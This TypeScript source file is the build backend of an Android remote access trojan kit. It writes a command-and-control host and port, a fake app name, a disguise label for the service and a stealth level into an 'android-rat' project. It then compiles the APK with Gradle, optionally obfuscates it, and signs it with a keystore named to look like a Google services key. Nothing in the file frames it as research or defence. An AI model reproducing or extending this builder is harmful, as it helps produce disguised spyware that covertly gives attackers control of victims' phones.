import { spawn, execSync } from 'child_process';
import path from 'path';
import fs from 'fs';
import { randomUUID } from 'crypto';
import type { BuildJob } from './types.js';

const JOBS = new Map<string, BuildJob>();
const APK_OUT_DIR     = path.resolve(process.cwd(), 'apk-output');
const ANDROID_PROJECT = path.resolve(process.cwd(), '..', 'android-rat');

if (!fs.existsSync(APK_OUT_DIR)) fs.mkdirSync(APK_OUT_DIR, { recursive: true });

export interface BuildConfig {
  serverHost:       string;
  serverPort:       number;
  appName:          string;
  packageName:      string;
  disguiseLabel:    string;
  keystoreAlias:    string;
  keystorePassword: string;
  signingMode:      'debug' | 'release';
  obfuscate:        boolean;
  stealthLevel:     1 | 2 | 3;
}

export function getJob(jobId: string): BuildJob | undefined {
  return JOBS.get(jobId);
}

export async function startBuild(config: BuildConfig): Promise<string> {
  const jobId = randomUUID();
  const job: BuildJob = { jobId, stage: 'queued', progress: 0, log: [] };
  JOBS.set(jobId, job);
  runBuild(job, config).catch((err: Error) => {
    job.stage = 'error';
    job.error = err.message;
    job.log.push(`❌ ${err.message}`);
  });
  return jobId;
}

/* ── Locate uber-apk-signer jar ─────────────────────────────
   Searches: ../uber-apk-signer-main/target/, then ./          */
function findSignerJar(): string | null {
  const searchDirs = [
    path.resolve(process.cwd(), '..', 'uber-apk-signer-main', 'target'),
    path.resolve(process.cwd(), '..'),
    process.cwd(),
  ];
  for (const dir of searchDirs) {
    if (!fs.existsSync(dir)) continue;
    const jar = fs.readdirSync(dir)
      .filter(f => f.startsWith('uber-apk-signer') && f.endsWith('.jar') && !f.includes('sources'))
      .sort()
      .pop();
    if (jar) return path.join(dir, jar);
  }
  return null;
}

/* ── Main build pipeline ────────────────────────────────────── */
async function runBuild(job: BuildJob, config: BuildConfig): Promise<void> {
  const buildStart = Date.now();

  /* 1. Patch local.properties ──────────────────────────────── */
  job.stage = 'building';
  job.log.push('Patching local.properties...');
  const localPropsPath = path.join(ANDROID_PROJECT, 'local.properties');
  const existing = fs.existsSync(localPropsPath)
    ? fs.readFileSync(localPropsPath, 'utf8')
    : '';
  fs.writeFileSync(localPropsPath, patchProperties(existing, {
    'c2.host':      config.serverHost,
    'c2.port':      String(config.serverPort),
    'app.name':     config.appName,
    'stealth.level': String(config.stealthLevel),
  }), 'utf8');
  job.log.push('✓ local.properties patched');
  job.progress = 8;

  /* 2. Patch strings.xml ───────────────────────────────────── */
  const stringsPath = path.join(
    ANDROID_PROJECT, 'app', 'src', 'main', 'res', 'values', 'strings.xml'
  );
  if (fs.existsSync(stringsPath)) {
    let xml = fs.readFileSync(stringsPath, 'utf8');
    xml = xml.replace(
      /<string name="app_name">.*?<\/string>/,
      `<string name="app_name">${escapeXml(config.appName)}</string>`
    );
    xml = xml.replace(
      /<string name="service_label">.*?<\/string>/,
      `<string name="service_label">${escapeXml(config.disguiseLabel)}</string>`
    );
    fs.writeFileSync(stringsPath, xml, 'utf8');
    job.log.push('✓ strings.xml patched');
  }
  job.progress = 15;

  /* 3. Make gradlew executable (Linux/macOS) ──────────────── */
  const gradlew = process.platform === 'win32'
    ? path.join(ANDROID_PROJECT, 'gradlew.bat')
    : path.join(ANDROID_PROJECT, 'gradlew');

  if (process.platform !== 'win32' && fs.existsSync(gradlew)) {
    try {
      execSync(`chmod +x "${gradlew}"`);
      job.log.push('✓ gradlew made executable');
    } catch {
      job.log.push('⚠ chmod failed (may already be executable)');
    }
  }
  job.progress = 18;

  /* 4. Gradle build ────────────────────────────────────────── */
  const gradleTask  = config.obfuscate ? 'assembleRelease' : 'assembleDebug';
  const buildFlavor = config.obfuscate ? 'release' : 'debug';

  job.log.push(`Running: gradlew ${gradleTask}`);

  await execProcess(
    gradlew,
    [gradleTask, '--no-daemon', '--stacktrace'],
    ANDROID_PROJECT,
    (line) => {
      job.log.push(line);
      if (line.includes('BUILD SUCCESSFUL')) job.progress = 75;
      else if (line.includes(':app:compile'))
        job.progress = Math.min((job.progress) + 2, 65);
    }
  );

  job.log.push('✓ Gradle build complete');
  job.progress = 78;

  /* 5. Locate unsigned APK ─────────────────────────────────── */
  const apkDir = path.join(
    ANDROID_PROJECT, 'app', 'build', 'outputs', 'apk', buildFlavor
  );
  if (!fs.existsSync(apkDir)) throw new Error(`APK output dir not found: ${apkDir}`);

  const apkFiles = fs.readdirSync(apkDir)
    .filter(f => f.endsWith('.apk'))
    .map(f => ({ name: f, mtime: fs.statSync(path.join(apkDir, f)).mtimeMs }))
    .sort((a, b) => b.mtime - a.mtime); // newest first

  if (apkFiles.length === 0) throw new Error('No APK found after Gradle build');

  const unsignedApk = path.join(apkDir, apkFiles[0].name);
  job.log.push(`APK: ${apkFiles[0].name}`);
  job.progress = 82;

  /* 6. Sign with uber-apk-signer ───────────────────────────── */
  if (config.signingMode === 'release') {
    const signerJar = findSignerJar();
    if (!signerJar) {
      job.log.push('⚠ uber-apk-signer jar not found — copying unsigned APK');
      const dest = path.join(APK_OUT_DIR, `${job.jobId}.apk`);
      fs.copyFileSync(unsignedApk, dest);
      job.outputPath = dest;
    } else {
      job.stage = 'signing';
      job.log.push(`Signing with: ${path.basename(signerJar)}`);

      const keystorePath = path.join(ANDROID_PROJECT, 'google-services-release.jks');
      if (!fs.existsSync(keystorePath)) throw new Error('Keystore not found: google-services-release.jks');

      await execProcess(
        'java',
        [
          '-jar', signerJar,
          '--apks', unsignedApk,
          '--ks',        keystorePath,
          '--ksAlias',   config.keystoreAlias,
          '--ksKeyPass', config.keystorePassword,
          '--ksPass',    config.keystorePassword,
          '--out', APK_OUT_DIR,
          '--allowResign',
        ],
        process.cwd(),
        (line) => job.log.push(line)
      );

      // uber-apk-signer output: <name>-aligned-debugSigned.apk or <name>-aligned-released.apk
      // Find the APK written after buildStart
      const signedFiles = fs.readdirSync(APK_OUT_DIR)
        .filter(f => f.endsWith('.apk'))
        .map(f => ({ name: f, mtime: fs.statSync(path.join(APK_OUT_DIR, f)).mtimeMs }))
        .filter(f => f.mtime >= buildStart)
        .sort((a, b) => b.mtime - a.mtime);

      if (signedFiles.length === 0) throw new Error('Signed APK not found in output dir');
      job.outputPath = path.join(APK_OUT_DIR, signedFiles[0].name);
      job.log.push(`✓ Signed: ${signedFiles[0].name}`);
    }
  } else {
    // Debug — just copy
    const dest = path.join(APK_OUT_DIR, `${job.jobId}-debug.apk`);
    fs.copyFileSync(unsignedApk, dest);
    job.outputPath = dest;
    job.log.push('⚠ Debug APK (unsigned)');
  }

  job.stage    = 'done';
  job.progress = 100;
  job.log.push('✅ Build complete');
}

/* ── Helpers ────────────────────────────────────────────────── */

function patchProperties(content: string, patches: Record<string, string>): string {
  let out = content.trimEnd();
  for (const [key, value] of Object.entries(patches)) {
    const re = new RegExp(`^${key.replace('.', '\\.')}=.*$`, 'm');
    if (re.test(out)) out = out.replace(re, `${key}=${value}`);
    else out += `\n${key}=${value}`;
  }
  return out + '\n';
}

function escapeXml(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function execProcess(
  cmd: string,
  args: string[],
  cwd: string,
  onLine: (line: string) => void
): Promise<void> {
  return new Promise((resolve, reject) => {
    const proc = spawn(cmd, args, {
      cwd,
      shell: process.platform === 'win32',
      env: { ...process.env, JAVA_TOOL_OPTIONS: '-Xmx2g' },
    });

    const handle = (chunk: Buffer) =>
      chunk.toString().split('\n').map(l => l.trimEnd()).filter(Boolean).forEach(onLine);

    proc.stdout.on('data', handle);
    proc.stderr.on('data', handle);

    proc.on('close', code => {
      if (code === 0) resolve();
      else reject(new Error(`Process "${path.basename(cmd)}" exited with code ${code}`));
    });
    proc.on('error', reject);
  });
}
